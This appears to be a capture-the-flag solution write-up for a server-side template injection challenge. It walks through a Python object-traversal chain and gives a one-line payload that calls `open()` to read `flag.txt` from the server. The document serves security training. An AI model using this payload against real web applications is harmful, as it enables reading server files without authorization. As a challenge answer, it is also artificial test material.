# How to Solve the Challenge?

Provide reproducible steps to solve the challenge. This can include:

- Runnable code (e.g., `PoC.py`)
- A Bash script or a sequence of commented commands
- Well-explained instructions
- ...

Ensure that all dependencies required to build or run the solution are provided (e.g., `requirements.txt`) or thoroughly documented.

Steps:

1.  `{{''.__class__.__mro__[1].__subclasses__()}}` produces a list of subclasses available we must find the index of the one we want to use.
2.  This solution will use the `warnings.catch_warnings` class at the index N (N can be found using binary search).
3.  Exploring the class we find that we can use the builtin function `open()` to read a server side file making our final payload `{{ ''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__.__builtins__.open("flag.txt").read()}}`. (Replace N with the index you found. User is expected to guess that the file is named `flag.txt`.)
4.  The flag will be read and translated to "Venusian" (ROT12 Cypher), at which point the user can translate back to english and get the flag.

One Step PAYLOAD:
`{{ ''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__.__builtins__.open("flag.txt").read()}}`
